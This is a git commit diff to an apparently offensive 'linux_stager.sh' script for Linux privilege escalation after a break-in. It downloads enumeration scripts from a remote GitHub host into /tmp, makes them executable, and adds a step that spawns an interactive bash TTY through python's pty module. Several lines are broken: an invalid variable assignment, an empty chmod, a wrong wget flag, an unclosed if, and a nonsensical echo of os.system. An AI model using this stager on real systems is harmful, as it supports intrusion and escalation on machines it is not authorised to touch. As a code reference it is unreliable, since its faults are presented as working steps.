31209dbe5c9f28dde60509a08c1de5f807f31d9c
WillChaos <46702070+WillChaos@users.noreply.github.com>
2019-03-02 17:53:38 +0800

    Update linux_stager.sh

--- PrivEsc/linux_stager.sh
+++ PrivEsc/linux_stager.sh
@@ -1,4 +1,4 @@
-# used to stage all appropriate tools needed for privesc
+# used to stage all appropriate tools needed for privesc + handles some base config setup
 # download this file using: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh
 
 $stage = /tmp
@@ -21,3 +21,21 @@ chmod +x $stage/linenum.sh
 echo "[*] Downloadingf LinuxPrivChecker.sh to: $stage + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
 chmod +x 
+
+# semi interactive shell
+echo "[*] Attempting to build semi-interactive shell "
+if command -v python &>/dev/null; then
+    echo "-[*] Python availble, dropping semi-tty shell"
+    python -c 'import pty;pty.spawn("/bin/bash");'
+    
+if command -v python3 &>/dev/null; then
+    echo "-[*] Python 3 availble, dropping semi-tty shell"
+    python3 -c 'import pty;pty.spawn("/bin/bash");' 
+    
+else
+    echo "-[*] python doesnt look to be installed, attempting a last rersort bash tty method (may or may not work)"
+    echo os.system('/bin/bash')
+fi
+echo "-[+] dont forget to use CTR+Z, then: stty raw -echo , then: fg <enter> <enter>"
+
+
